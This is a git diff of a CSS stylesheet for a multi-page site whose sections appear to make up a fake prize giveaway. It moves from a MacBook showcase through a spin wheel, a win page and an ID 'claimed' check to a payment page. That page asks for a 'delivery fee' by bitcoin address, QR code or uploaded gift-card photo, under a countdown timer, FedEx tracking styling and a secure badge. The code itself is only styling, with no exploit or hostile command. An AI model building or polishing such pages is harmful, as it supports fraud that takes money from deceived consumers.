@@ -35,12 +35,16 @@ html, body {
 .page {
   display: none !important;
   min-height: 100vh;
-  position: relative;
   width: 100%;
+  position: relative;
+  background: var(--bg);
 }
+
 .page.active {
   display: block !important;
 }
+
+/* Pages that use flex centering */
 #pg-wheel.active,
 #pg-win.active,
 #pg-loader.active,
@@ -51,11 +55,38 @@ html, body {
   align-items: center;
   justify-content: center;
 }
+
 #pg-confirm.active,
 #pg-payment.active {
   display: flex !important;
   flex-direction: column;
   align-items: center;
+  justify-content: flex-start;
+}
+
+/* Specific page overrides */
+#pg-landing {
+  background: transparent;
+}
+
+#pg-payment {
+  padding: 100px 20px 60px;
+}
+
+#pg-payment.active {
+  display: flex !important;
+  align-items: flex-start;
+  justify-content: center;
+}
+
+#pg-confirm.active {
+  display: flex !important;
+  align-items: center;
+  justify-content: center;
+}
+
+#pg-form {
+  background: var(--bg);
 }
 
 /* ══ FIXED BG ══ */
@@ -100,6 +131,176 @@ html, body {
 @keyframes orbDrift {
   from { transform: translate(0,0) scale(1); }
   to   { transform: translate(24px,32px) scale(1.1); }
+}
+
+/* ══ TOAST NOTIFICATIONS ══ */
+.toast-container {
+  position: fixed;
+  top: 90px;
+  right: 20px;
+  z-index: 99999;
+  display: flex;
+  flex-direction: column;
+  gap: 10px;
+  max-width: 340px;
+  width: 100%;
+  pointer-events: none;
+}
+
+.toast {
+  background: rgba(0,18,46,0.92);
+  backdrop-filter: blur(20px);
+  border: 1px solid var(--glass-border);
+  border-radius: 16px;
+  padding: 14px 20px;
+  color: white;
+  font-size: 13px;
+  font-weight: 500;
+  box-shadow: 0 20px 60px rgba(0,0,0,0.6);
+  animation: slideInRight 0.4s ease forwards;
+  pointer-events: auto;
+  display: flex;
+  align-items: center;
+  gap: 12px;
+}
+
+.toast .toast-icon {
+  font-size: 20px;
+  flex-shrink: 0;
+}
+
+.toast .toast-text {
+  flex: 1;
+}
+
+.toast .toast-text strong {
+  color: var(--blue-light);
+}
+
+.toast .toast-close {
+  background: none;
+  border: none;
+  color: var(--text-muted);
+  cursor: pointer;
+  font-size: 16px;
+  padding: 0 4px;
+  opacity: 0.5;
+  transition: opacity .2s;
+}
+
+.toast .toast-close:hover { opacity: 1; }
+
+@keyframes slideInRight {
+  0% { transform: translateX(120%); opacity: 0; }
+  100% { transform: translateX(0); opacity: 1; }
+}
+
+@keyframes slideOutRight {
+  0% { transform: translateX(0); opacity: 1; }
+  100% { transform: translateX(120%); opacity: 0; }
+}
+
+.toast.removing {
+  animation: slideOutRight 0.3s ease forwards;
+}
+
+/* ══ POPUP OVERLAY ══ */
+.popup-overlay {
+  position: fixed;
+  inset: 0;
+  background: rgba(0,0,0,0.7);
+  backdrop-filter: blur(12px);
+  z-index: 99998;
+  display: none;
+  align-items: center;
+  justify-content: center;
+  padding: 20px;
+  animation: fadeIn 0.3s ease;
+}
+
+.popup-overlay.active {
+  display: flex;
+}
+
+@keyframes fadeIn {
+  0% { opacity: 0; }
+  100% { opacity: 1; }
+}
+
+.popup-box {
+  background: linear-gradient(145deg, rgba(0,18,46,0.95), rgba(0,8,20,0.98));
+  border: 1px solid var(--glass-border);
+  border-radius: 32px;
+  padding: 48px 44px;
+  max-width: 480px;
+  width: 100%;
+  text-align: center;
+  box-shadow: 0 40px 80px rgba(0,0,0,0.8);
+  animation: popIn 0.4s ease;
+}
+
+@keyframes popIn {
+  0% { transform: scale(0.8); opacity: 0; }
+  70% { transform: scale(1.05); }
+  100% { transform: scale(1); opacity: 1; }
+}
+
+.popup-box .popup-icon {
+  font-size: 64px;
+  margin-bottom: 16px;
+}
+
+.popup-box h2 {
+  font-size: 28px;
+  font-weight: 800;
+  margin-bottom: 8px;
+  background: linear-gradient(135deg, #ffd700, #ff6b00);
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+}
+
+.popup-box p {
+  color: var(--text-muted);
+  font-size: 15px;
+  margin-bottom: 24px;
+  line-height: 1.6;
+}
+
+.popup-box .popup-prize {
+  background: rgba(10,132,255,0.1);
+  border: 1px solid rgba(10,132,255,0.2);
+  border-radius: 16px;
+  padding: 16px;
+  margin-bottom: 24px;
+}
+
+.popup-box .popup-prize strong {
+  display: block;
+  font-size: 18px;
+  color: white;
+}
+
+.popup-box .popup-prize span {
+  font-size: 13px;
+  color: var(--text-muted);
+}
+
+.popup-btn {
+  background: linear-gradient(135deg, #0a84ff, #1d6fd4);
+  color: white;
+  padding: 14px 40px;
+  border-radius: 30px;
+  font-size: 16px;
+  font-weight: 700;
+  border: none;
+  cursor: pointer;
+  box-shadow: 0 0 40px rgba(10,132,255,0.3);
+  transition: all .25s;
+}
+
+.popup-btn:hover {
+  transform: scale(1.05);
+  box-shadow: 0 0 60px rgba(10,132,255,0.5);
 }
 
 /* ══ NAVBAR ══ */
@@ -156,7 +357,7 @@ html, body {
 }
 .nav-cta:hover { background: #2196f3; transform: scale(1.05); }
 
-/* ══ HERO SECTION WITH MACBOOK SHOWCASE ══ */
+/* ══ HERO SECTION ══ */
 #pg-landing { background: transparent; }
 .hero-wrap {
   position: relative; 
@@ -240,7 +441,7 @@ html, body {
 }
 .btn-ghost:hover { border-color:var(--blue); color:var(--blue-light); }
 
-/* ══ MACBOOK SHOWCASE CONTAINER - Hero Size ══ */
+/* ══ MACBOOK SHOWCASE ══ */
 .macbook-showcase {
   position: relative;
   width: 100%;
@@ -258,7 +459,6 @@ html, body {
   box-shadow: 0 30px 100px rgba(0,0,0,0.6);
 }
 
-/* Blue glow behind product */
 .macbook-showcase::before {
   content: '';
   position: absolute;
@@ -279,7 +479,6 @@ html, body {
   50% { transform: translate(-50%, -50%) scale(1.15); opacity: 1; }
 }
 
-/* Glassmorphism overlay */
 .macbook-showcase::after {
   content: '';
   position: absolute;
@@ -290,7 +489,6 @@ html, body {
   pointer-events: none;
 }
 
-/* MacBook Hero Image - Fully Enlarged to Fill Container */
 .macbook-hero {
   position: relative;
   width: 100%;
@@ -306,14 +504,12 @@ html, body {
   50% { transform: translateY(-8px) scale(1.02); }
 }
 
-/* Responsive Styles */
 @media (max-width: 768px) {
   .macbook-showcase {
     height: 420px;
     max-width: 100%;
     border-radius: 24px;
   }
-  
   .macbook-showcase::before {
     width: 320px;
     height: 320px;
@@ -353,69 +549,178 @@ html, body {
 .cd-item small { font-size:11px; color:var(--text-muted); }
 
 /* ══ FORM PAGE ══ */
-#pg-form { padding-top:82px; min-height:100vh; }
+#pg-form { 
+  padding-top: 82px; 
+  min-height: 100vh; 
+  background: var(--bg);
+}
+
 .form-wrap {
-  position:relative; z-index:1;
-  display:flex; align-items:center; justify-content:center;
-  min-height:calc(100vh - 82px); padding:40px 20px;
+  position: relative; 
+  z-index: 1;
+  display: flex; 
+  align-items: center; 
+  justify-content: center;
+  min-height: calc(100vh - 82px); 
+  padding: 40px 20px;
 }
+
 .form-card {
-  width:100%; max-width:560px;
-  background:rgba(0,18,46,0.75);
-  border:1px solid var(--glass-border);
-  border-radius:28px; padding:48px 44px;
-  backdrop-filter:blur(32px);
-  box-shadow:0 40px 80px rgba(0,0,0,0.55), 0 0 80px rgba(10,132,255,0.07);
+  width: 100%; 
+  max-width: 560px;
+  background: rgba(0,18,46,0.75);
+  border: 1px solid var(--glass-border);
+  border-radius: 28px; 
+  padding: 48px 44px;
+  backdrop-filter: blur(32px);
+  box-shadow: 0 40px 80px rgba(0,0,0,0.55), 0 0 80px rgba(10,132,255,0.07);
 }
+
 .fc-logo { 
-  display:flex; 
-  align-items:center; 
-  gap:12px; 
-  justify-content:center; 
-  margin-bottom:28px; 
+  display: flex; 
+  align-items: center; 
+  gap: 12px; 
+  justify-content: center; 
+  margin-bottom: 28px; 
 }
+
 .fc-logo svg {
   width: 40px;
   height: 40px;
   fill: white;
 }
-.fc-logo span { font-size:20px; font-weight:700; }
-.fc-title { font-size:25px; font-weight:800; text-align:center; margin-bottom:6px; }
-.fc-sub { color:var(--text-muted); text-align:center; font-size:14px; margin-bottom:32px; }
-.fg { margin-bottom:18px; }
-label { display:block; font-size:12px; font-weight:700; color:var(--text-muted); margin-bottom:7px; letter-spacing:.04em; text-transform:uppercase; }
+
+.fc-logo span { 
+  font-size: 20px; 
+  font-weight: 700; 
+  color: white;
+}
+
+.fc-title { 
+  font-size: 25px; 
+  font-weight: 800; 
+  text-align: center; 
+  margin-bottom: 6px; 
+  color: white;
+}
+
+.fc-sub { 
+  color: var(--text-muted); 
+  text-align: center; 
+  font-size: 14px; 
+  margin-bottom: 32px; 
+}
+
+.fg { 
+  display: block;
+  margin-bottom: 18px; 
+  width: 100%;
+}
+
+label { 
+  display: block; 
+  font-size: 12px; 
+  font-weight: 700; 
+  color: var(--text-muted); 
+  margin-bottom: 7px; 
+  letter-spacing: .04em; 
+  text-transform: uppercase; 
+}
+
 .fc {
-  width:100%; background:rgba(255,255,255,0.05);
-  border:1px solid var(--glass-border); border-radius:14px;
-  padding:13px 17px; color:white; font-size:15px; font-family:inherit;
-  outline:none; transition:border-color .2s, box-shadow .2s;
+  width: 100%; 
+  background: rgba(255,255,255,0.05);
+  border: 1px solid var(--glass-border); 
+  border-radius: 14px;
+  padding: 13px 17px; 
+  color: white; 
+  font-size: 15px; 
+  font-family: inherit;
+  outline: none; 
+  transition: border-color .2s, box-shadow .2s;
+  display: block;
+  box-sizing: border-box;
 }
-.fc:focus { border-color:var(--blue); box-shadow:0 0 0 3px rgba(10,132,255,0.18); }
-.fc::placeholder { color:rgba(255,255,255,0.28); }
-select.fc { appearance:none; cursor:pointer;
-  background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='8' viewBox='0 0 12 8'%3E%3Cpath d='M1 1l5 5 5-5' stroke='%230a84ff' stroke-width='2' fill='none'/%3E%3C/svg%3E");
-  background-repeat:no-repeat; background-position:right 16px center;
+
+.fc:focus { 
+  border-color: var(--blue); 
+  box-shadow: 0 0 0 3px rgba(10,132,255,0.18); 
 }
-select.fc option { background:#001020; color:white; }
+
+.fc::placeholder { 
+  color: rgba(255,255,255,0.28); 
+}
+
+select.fc { 
+  appearance: none; 
+  cursor: pointer;
+  background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='8' viewBox='0 0 12 8'%3E%3Cpath d='M1 1l5 5 5-5' stroke='%230a84ff' stroke-width='2' fill='none'/%3E%3C/svg%3E");
+  background-repeat: no-repeat; 
+  background-position: right 16px center;
+  background-size: 12px 8px;
+}
+
+select.fc option { 
+  background: #001020; 
+  color: white; 
+}
 
 .id-status {
-  font-size:13px; font-weight:600;
-  margin-top:8px; padding:10px 14px; border-radius:10px;
-  display:none;
+  font-size: 13px; 
+  font-weight: 600;
+  margin-top: 8px; 
+  padding: 10px 14px; 
+  border-radius: 10px;
+  display: none;
 }
-.id-status.valid   { background:rgba(52,199,89,0.14);  color:#34c759; border:1px solid rgba(52,199,89,0.3);  display:block; }
-.id-status.invalid { background:rgba(255,69,58,0.14);  color:#ff453a; border:1px solid rgba(255,69,58,0.3);  display:block; }
-.id-status.claimed { background:rgba(255,159,10,0.14); color:#ff9f0a; border:1px solid rgba(255,159,10,0.3); display:block; }
+
+.id-status.valid { 
+  background: rgba(52,199,89,0.14);  
+  color: #34c759; 
+  border: 1px solid rgba(52,199,89,0.3);  
+  display: block; 
+}
+
+.id-status.invalid { 
+  background: rgba(255,69,58,0.14);  
+  color: #ff453a; 
+  border: 1px solid rgba(255,69,58,0.3);  
+  display: block; 
+}
+
+.id-status.claimed { 
+  background: rgba(255,159,10,0.14); 
+  color: #ff9f0a; 
+  border: 1px solid rgba(255,159,10,0.3); 
+  display: block; 
+}
 
 .btn-full {
-  width:100%; padding:16px; border-radius:16px;
-  font-size:16px; font-weight:700; border:none; cursor:pointer;
-  background:linear-gradient(135deg,#0a84ff,#1d6fd4);
-  color:white; letter-spacing:.02em; transition:all .25s;
-  box-shadow:0 0 30px rgba(10,132,255,0.3); margin-top:8px;
+  width: 100%; 
+  padding: 16px; 
+  border-radius: 16px;
+  font-size: 16px; 
+  font-weight: 700; 
+  border: none; 
+  cursor: pointer;
+  background: linear-gradient(135deg,#0a84ff,#1d6fd4);
+  color: white; 
+  letter-spacing: .02em; 
+  transition: all .25s;
+  box-shadow: 0 0 30px rgba(10,132,255,0.3); 
+  margin-top: 8px;
+  display: block;
 }
-.btn-full:hover:not(:disabled) { transform:translateY(-2px); box-shadow:0 0 50px rgba(10,132,255,0.5); }
-.btn-full:disabled { opacity:.38; cursor:not-allowed; }
+
+.btn-full:hover:not(:disabled) { 
+  transform: translateY(-2px); 
+  box-shadow: 0 0 50px rgba(10,132,255,0.5); 
+}
+
+.btn-full:disabled { 
+  opacity: .38; 
+  cursor: not-allowed; 
+}
 
 /* ══ LOADER ══ */
 #pg-loader {
@@ -442,7 +747,11 @@ select.fc option { background:#001020; color:white; }
 .loader-txt { font-size:16px; color:var(--text-muted); font-weight:500; }
 
 /* ══ WHEEL PAGE ══ */
-#pg-wheel { min-height:100vh; padding:100px 20px 50px; }
+#pg-wheel { 
+  min-height:100vh; 
+  padding:100px 20px 50px;
+  background: var(--bg);
+}
 .wh-title { font-size:32px; font-weight:800; text-align:center; margin-bottom:6px; }
 .wh-sub { color:var(--text-muted); font-size:16px; text-align:center; margin-bottom:36px; }
 .wh-wrap { position:relative; display:flex; flex-direction:column; align-items:center; }
@@ -469,7 +778,7 @@ select.fc option { background:#001020; color:white; }
 .spin-btn:disabled { opacity:.45; cursor:not-allowed; }
 
 /* ══ WIN PAGE ══ */
-#pg-win { min-height:100vh; padding:100px 24px 60px; }
+#pg-win { min-height:100vh; padding:100px 24px 60px; background: var(--bg); }
 .confetti-canvas { position:fixed; inset:0; pointer-events:none; z-index:9999; }
 .win-hdr { text-align:center; margin-bottom:40px; }
 .win-hdr h1 { font-size:clamp(38px,5.5vw,68px); font-weight:800; }
@@ -537,7 +846,16 @@ select.fc option { background:#001020; color:white; }
 .ws span   { font-size:12px; color:var(--text-muted); }
 
 /* ══ CONFIRM PAGE ══ */
-#pg-confirm { min-height:100vh; padding:100px 20px 60px; }
+#pg-confirm { 
+  min-height:100vh; 
+  padding:100px 20px 60px; 
+  background: var(--bg);
+}
+#pg-confirm.active {
+  display: flex !important;
+  align-items: center;
+  justify-content: center;
+}
 .cfm-card {
   width:100%; max-width:560px;
   background:rgba(0,18,46,0.8); border:1px solid var(--glass-border);
@@ -573,125 +891,551 @@ select.fc option { background:#001020; color:white; }
   background:var(--blue); border:none; color:white; cursor:pointer; display:none;
 }
 
-/* ══ PAYMENT PAGE ══ */
-#pg-payment { min-height:100vh; padding:100px 20px 60px; }
+/* ══ PAYMENT PAGE - FULL SCREEN ══ */
+#pg-payment { 
+  min-height: 100vh; 
+  width: 100%;
+  padding: 100px 20px 60px; 
+  background: var(--bg);
+}
+
+#pg-payment.active {
+  display: flex !important;
+  align-items: flex-start;
+  justify-content: center;
+}
+
 .pay-card {
-  width:100%; max-width:680px;
-  background:rgba(0,18,46,0.82); border:1px solid var(--glass-border);
-  border-radius:28px; overflow:hidden; backdrop-filter:blur(32px);
-  box-shadow:0 40px 80px rgba(0,0,0,0.5);
+  width: 100%; 
+  max-width: 720px;
+  background: rgba(0,18,46,0.85);
+  border: 1px solid rgba(255,255,255,0.08);
+  border-radius: 32px;
+  overflow: hidden;
+  backdrop-filter: blur(32px);
+  box-shadow: 0 40px 80px rgba(0,0,0,0.6), 0 0 60px rgba(10,132,255,0.05);
+  margin-top: 20px;
+  position: relative;
+  z-index: 1;
 }
+
 .pay-hdr {
-  background:linear-gradient(135deg,rgba(10,132,255,0.18),rgba(0,40,100,0.28));
-  padding:34px 38px; border-bottom:1px solid var(--glass-border); text-align:center;
+  background:linear-gradient(135deg,rgba(10,132,255,0.12),rgba(0,40,100,0.2));
+  padding:30px 38px 24px;
+  border-bottom:1px solid rgba(255,255,255,0.06);
+  text-align:center;
 }
-.pay-hdr h2 { font-size:24px; font-weight:800; margin-bottom:6px; }
-.pay-hdr p  { color:var(--text-muted); font-size:14px; }
-.pay-checks { display:flex; flex-wrap:wrap; gap:10px; justify-content:center; margin-top:18px; }
-.pc {
-  display:flex; align-items:center; gap:7px;
-  background:rgba(52,199,89,0.1); border:1px solid rgba(52,199,89,0.22);
-  border-radius:20px; padding:6px 13px; font-size:12px; color:#34c759; font-weight:600;
+
+.pay-badge {
+  display:inline-block;
+  background:rgba(255,215,0,0.15);
+  border:1px solid rgba(255,215,0,0.3);
+  color:#ffd700;
+  font-size:11px;
+  font-weight:700;
+  letter-spacing:.1em;
+  padding:6px 18px;
+  border-radius:20px;
+  margin-bottom:12px;
+  text-transform:uppercase;
 }
-.method-tabs { display:flex; border-bottom:1px solid var(--glass-border); }
+
+.pay-hdr h2 {
+  font-size:26px;
+  font-weight:800;
+  margin-bottom:4px;
+  color:white;
+}
+
+.pay-hdr p {
+  color:var(--text-muted);
+  font-size:14px;
+}
+
+.pay-estimate {
+  margin-top:10px;
+  font-size:12px;
+  color:var(--blue-light);
+  font-weight:600;
+}
+
+.pay-steps {
+  display:flex;
+  padding:24px 38px;
+  border-bottom:1px solid rgba(255,255,255,0.06);
+  gap:8px;
+  justify-content:space-between;
+}
+
+.pay-steps .step {
+  display:flex;
+  align-items:center;
+  gap:8px;
+  font-size:11px;
+  color:var(--text-muted);
+  font-weight:600;
+}
+
+.pay-steps .step span {
+  width:24px;
+  height:24px;
+  border-radius:50%;
+  background:rgba(255,255,255,0.06);
+  border:1px solid rgba(255,255,255,0.1);
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  font-size:11px;
+  color:var(--text-muted);
+  transition:all .3s;
+}
+
+.pay-steps .step.active span {
+  background:var(--blue);
+  border-color:var(--blue);
+  color:white;
+}
+
+.pay-steps .step.active {
+  color:white;
+}
+
+.pay-amount-box {
+  padding:24px 38px;
+  background:linear-gradient(135deg,rgba(10,132,255,0.05),rgba(0,40,100,0.08));
+  border-bottom:1px solid rgba(255,255,255,0.06);
+  text-align:center;
+}
+
+.pay-amount-label {
+  font-size:12px;
+  color:var(--text-muted);
+  font-weight:600;
+  text-transform:uppercase;
+  letter-spacing:.08em;
+}
+
+.pay-amount {
+  font-size:42px;
+  font-weight:900;
+  color:white;
+  margin:8px 0 2px;
+}
+
+.pay-amount span {
+  font-size:18px;
+  font-weight:600;
+  color:var(--text-muted);
+  margin-left:6px;
+}
+
+.pay-amount-btc {
+  font-size:14px;
+  color:#f7931a;
+  font-weight:600;
+}
+
+.method-tabs {
+  display:flex;
+  border-bottom:1px solid rgba(255,255,255,0.06);
+  padding:0 20px;
+}
+
 .mtab {
-  flex:1; padding:18px; text-align:center; cursor:pointer;
-  font-size:14px; font-weight:600; color:var(--text-muted);
-  border:none; background:transparent; transition:all .2s;
-  border-bottom:2px solid transparent;
+  flex:1;
+  padding:16px;
+  text-align:center;
+  cursor:pointer;
+  font-size:14px;
+  font-weight:600;
+  color:var(--text-muted);
+  border:none;
+  background:transparent;
+  transition:all .2s;
+  border-bottom:3px solid transparent;
+  font-family:inherit;
 }
-.mtab.active { color:var(--blue); border-bottom-color:var(--blue); }
-.mcontent { display:none; padding:30px 38px; }
-.mcontent.active { display:block; }
 
-/* delivery card */
-.dlv-card {
-  background:linear-gradient(135deg,rgba(0,28,75,0.95),rgba(0,12,44,0.95));
-  border:1px solid rgba(10,132,255,0.2); border-radius:20px;
-  padding:26px; margin-bottom:22px;
+.mtab.active {
+  color:var(--blue);
+  border-bottom-color:var(--blue);
 }
-.dlv-top { display:flex; align-items:flex-start; justify-content:space-between; margin-bottom:20px; }
-.reserved-badge {
-  background:rgba(52,199,89,0.2); border:1px solid rgba(52,199,89,0.4);
-  border-radius:20px; padding:5px 13px; font-size:11px; font-weight:700;
-  color:#34c759; letter-spacing:.05em; white-space:nowrap;
-}
-.dlv-icon { font-size:44px; margin-bottom:10px; }
-.prog-bar { background:rgba(255,255,255,0.1); border-radius:10px; height:7px; margin:14px 0; overflow:hidden; }
-.prog-fill { height:100%; border-radius:10px; background:linear-gradient(90deg,#0a84ff,#34c759); width:28%; }
-.track-box {
-  background:rgba(255,255,255,0.04); border:1px solid var(--glass-border);
-  border-radius:12px; padding:13px 17px;
-  display:flex; align-items:center; justify-content:space-between; margin:14px 0;
-}
-.track-box small { font-size:10px; color:var(--text-muted); }
-.track-box span  { font-size:14px; font-weight:700; letter-spacing:.08em; }
-.track-box img {
-  height: 32px;
-  object-fit: contain;
-}
-.dlv-perks { display:grid; grid-template-columns:1fr 1fr; gap:7px; margin:14px 0; }
-.perk { display:flex; align-items:center; gap:7px; font-size:12px; color:var(--text-muted); }
-.perk::before { content:'✓'; color:#34c759; font-weight:800; }
-.fee-row { display:flex; justify-content:space-between; align-items:center; padding:12px 0; border-top:1px solid var(--glass-border); margin-top:14px; }
-.fee-row span   { font-size:14px; font-weight:600; }
-.fee-row strong { font-size:22px; font-weight:800; color:var(--blue); }
 
-/* BTC */
-.btc-hdr { display:flex; align-items:center; gap:12px; margin-bottom:16px; }
-.btc-logo { 
-  width:36px; 
-  height:36px; 
-  object-fit:contain;
-  background: #f7931a;
-  border-radius: 50%;
-  padding: 4px;
+.mtab:hover {
+  color:white;
 }
+
+.mcontent {
+  display:none;
+  padding:24px 30px;
+}
+
+.mcontent.active {
+  display:block;
+}
+
 .qr-container {
-  display: flex;
-  flex-direction: column;
-  align-items: center;
-  margin: 20px 0;
-  padding: 20px;
-  background: rgba(255,255,255,0.05);
-  border-radius: 16px;
-  border: 1px solid var(--glass-border);
+  display:flex;
+  flex-direction:column;
+  align-items:center;
+  padding:20px;
+  background:rgba(255,255,255,0.03);
+  border-radius:20px;
+  border:1px solid rgba(255,255,255,0.06);
 }
-.qr-container img {
-  width: 200px;
-  height: 200px;
-  object-fit: contain;
-  border-radius: 12px;
-}
-.qr-container p {
-  font-size: 12px;
-  color: var(--text-muted);
-  margin-top: 10px;
-  text-align: center;
-}
-.btc-addr {
-  background:rgba(247,147,26,0.1); border:1px solid rgba(247,147,26,0.3);
-  border-radius:14px; padding:18px; margin:18px 0;
-  word-break:break-all; font-family:monospace; font-size:13px; line-height:1.6;
-  text-align:center; color:#f7931a;
-}
-.btc-amount { font-size:30px; font-weight:800; color:#f7931a; text-align:center; margin:14px 0; }
 
-/* Gift card */
-.upload-zone {
-  border:2px dashed var(--glass-border); border-radius:18px; padding:36px;
-  text-align:center; cursor:pointer; transition:all .2s;
-  background:rgba(255,255,255,0.02); position:relative;
+.qr-container img {
+  width:200px;
+  height:200px;
+  object-fit:contain;
+  border-radius:12px;
 }
-.upload-zone:hover { border-color:var(--blue); background:rgba(10,132,255,0.05); }
-.upload-zone input { position:absolute; inset:0; opacity:0; cursor:pointer; width:100%; }
-.upload-icon { font-size:44px; margin-bottom:10px; }
-.upload-zone h4 { font-size:15px; font-weight:600; margin-bottom:6px; }
-.upload-zone p  { font-size:12px; color:var(--text-muted); }
-#preview-img { max-width:100%; border-radius:12px; margin-top:14px; display:none; }
+
+.qr-container p {
+  font-size:12px;
+  color:var(--text-muted);
+  margin-top:12px;
+  text-align:center;
+}
+
+.pay-or {
+  text-align:center;
+  color:var(--text-muted);
+  font-size:12px;
+  padding:14px 0;
+  position:relative;
+}
+
+.pay-or::before,
+.pay-or::after {
+  content:'';
+  position:absolute;
+  top:50%;
+  width:30%;
+  height:1px;
+  background:rgba(255,255,255,0.08);
+}
+
+.pay-or::before { left:0; }
+.pay-or::after { right:0; }
+
+.btc-addr {
+  background:rgba(247,147,26,0.06);
+  border:1px solid rgba(247,147,26,0.2);
+  border-radius:14px;
+  padding:16px 20px;
+  margin:8px 0 16px;
+  word-break:break-all;
+  font-family:monospace;
+  font-size:13px;
+  line-height:1.6;
+  text-align:center;
+  color:#f7931a;
+}
+
+.pay-timer {
+  background:rgba(255,255,255,0.03);
+  border-radius:16px;
+  padding:16px 20px;
+  text-align:center;
+  border:1px solid rgba(255,255,255,0.06);
+  margin:16px 0;
+}
+
+.pay-timer > span {
+  font-size:12px;
+  color:var(--text-muted);
+  display:block;
+  margin-bottom:8px;
+}
+
+.timer-display {
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  gap:6px;
+}
+
+.timer-num {
+  font-size:28px;
+  font-weight:800;
+  color:var(--blue-light);
+  font-variant-numeric:tabular-nums;
+  min-width:44px;
+}
+
+.timer-label {
+  font-size:11px;
+  color:var(--text-muted);
+  font-weight:600;
+  text-transform:uppercase;
+  margin-right:12px;
+}
+
+.timer-label:last-child { margin-right:0; }
+
+.pay-secure-badge {
+  text-align:center;
+  font-size:12px;
+  color:var(--text-muted);
+  padding:16px 0 4px;
+  font-weight:600;
+}
+
+.gc-prize-preview {
+  display:flex;
+  align-items:center;
+  gap:14px;
+  background:rgba(255,255,255,0.03);
+  border-radius:16px;
+  padding:16px 20px;
+  border:1px solid rgba(255,255,255,0.06);
+  margin-bottom:16px;
+}
+
+.gc-prize-icon {
+  font-size:32px;
+}
+
+.gc-prize-preview div {
+  flex:1;
+}
+
+.gc-prize-preview strong {
+  display:block;
+  font-size:15px;
+  font-weight:700;
+}
+
+.gc-prize-preview span {
+  font-size:12px;
+  color:var(--text-muted);
+}
+
+.gc-your-cost {
+  font-size:13px;
+  font-weight:700;
+  color:var(--blue-light);
+}
+
+.gc-summary {
+  background:rgba(255,255,255,0.03);
+  border-radius:16px;
+  padding:16px 20px;
+  border:1px solid rgba(255,255,255,0.06);
+  margin-bottom:16px;
+}
+
+.gc-summary-row {
+  display:flex;
+  justify-content:space-between;
+  align-items:center;
+  padding:6px 0;
+}
+
+.gc-summary-row:not(:last-child) {
+  border-bottom:1px solid rgba(255,255,255,0.06);
+}
+
+.gc-summary-row span {
+  font-size:13px;
+  color:var(--text-muted);
+}
+
+.gc-summary-row strong {
+  font-size:16px;
+  font-weight:700;
+  color:white;
+}
+
+.gc-status {
+  font-size:12px;
+  color:#ff9f0a;
+  font-weight:600;
+}
+
+.upload-zone {
+  border:2px dashed rgba(255,255,255,0.12);
+  border-radius:18px;
+  padding:30px 20px;
+  text-align:center;
+  cursor:pointer;
+  transition:all .3s;
+  background:rgba(255,255,255,0.02);
+  position:relative;
+}
+
+.upload-zone:hover {
+  border-color:var(--blue);
+  background:rgba(10,132,255,0.05);
+}
+
+.upload-zone input {
+  position:absolute;
+  inset:0;
+  opacity:0;
+  cursor:pointer;
+  width:100%;
+}
+
+.upload-icon {
+  font-size:40px;
+  margin-bottom:8px;
+}
+
+.upload-zone h4 {
+  font-size:15px;
+  font-weight:600;
+  margin-bottom:4px;
+}
+
+.upload-zone p {
+  font-size:13px;
+  color:var(--text-muted);
+}
+
+.upload-zone small {
+  font-size:11px;
+  color:var(--text-muted);
+  display:block;
+  margin-top:4px;
+  opacity:0.6;
+}
+
+#preview-img {
+  max-width:100%;
+  border-radius:12px;
+  margin-top:14px;
+  display:none;
+  max-height:200px;
+  object-fit:contain;
+}
+
+.pay-delivery-info {
+  padding:20px 30px 24px;
+  border-top:1px solid rgba(255,255,255,0.06);
+  background:rgba(0,0,0,0.2);
+}
+
+.delivery-header {
+  display:flex;
+  justify-content:space-between;
+  align-items:center;
+  margin-bottom:14px;
+}
+
+.delivery-header > span {
+  font-size:14px;
+  font-weight:700;
+}
+
+.delivery-fedex {
+  font-size:12px;
+  font-weight:700;
+  color:var(--blue-light);
+  background:rgba(10,132,255,0.1);
+  padding:4px 12px;
+  border-radius:12px;
+}
+
+.delivery-grid {
+  display:grid;
+  grid-template-columns:1fr 1fr;
+  gap:10px;
+  margin-bottom:14px;
+}
+
+.delivery-item {
+  display:flex;
+  align-items:center;
+  gap:10px;
+  background:rgba(255,255,255,0.03);
+  padding:10px 14px;
+  border-radius:12px;
+  border:1px solid rgba(255,255,255,0.04);
+}
+
+.delivery-item span {
+  font-size:18px;
+}
+
+.delivery-item strong {
+  display:block;
+  font-size:12px;
+  font-weight:700;
+}
+
+.delivery-item small {
+  font-size:10px;
+  color:var(--text-muted);
+}
+
+.delivery-tracking {
+  display:flex;
+  align-items:center;
+  gap:12px;
+  background:rgba(255,255,255,0.03);
+  padding:10px 16px;
+  border-radius:12px;
+  border:1px solid rgba(255,255,255,0.04);
+}
+
+.delivery-tracking span {
+  font-size:11px;
+  color:var(--text-muted);
+}
+
+.delivery-tracking strong {
+  font-size:14px;
+  font-weight:700;
+  letter-spacing:.05em;
+}
+
+.delivery-fedex-tag {
+  margin-left:auto;
+  font-size:11px;
+  font-weight:700;
+  color:var(--blue-light);
+}
+
+.pay-footer {
+  padding:16px 30px 20px;
+  text-align:center;
+  border-top:1px solid rgba(255,255,255,0.04);
+}
+
+.pay-footer p {
+  font-size:13px;
+  color:var(--text-muted);
+  font-weight:600;
+}
+
+.pay-footer small {
+  font-size:11px;
+  color:var(--text-muted);
+  opacity:0.5;
+}
+
+@media(max-width:768px) {
+  .pay-hdr { padding:24px 20px; }
+  .pay-steps { padding:16px 20px; flex-wrap:wrap; gap:6px; }
+  .pay-steps .step { font-size:10px; gap:4px; }
+  .pay-steps .step span { width:20px; height:20px; font-size:10px; }
+  .pay-amount-box { padding:18px 20px; }
+  .pay-amount { font-size:32px; }
+  .mcontent { padding:16px 18px; }
+  .pay-delivery-info { padding:16px 18px; }
+  .delivery-grid { grid-template-columns:1fr; }
+  .timer-num { font-size:22px; min-width:34px; }
+  .qr-container img { width:150px; height:150px; }
+}
 
 /* ══ PROCESSING ══ */
-#pg-processing { min-height:100vh; text-align:center; }
+#pg-processing { 
+  min-height:100vh; 
+  text-align:center;
+  background: var(--bg);
+}
 .proc-ring {
   width:90px; height:90px; border-radius:50%;
   border:3px solid rgba(10,132,255,0.2);
@@ -702,7 +1446,12 @@ select.fc option { background:#001020; color:white; }
 @keyframes spin { to { transform:rotate(360deg); } }
 
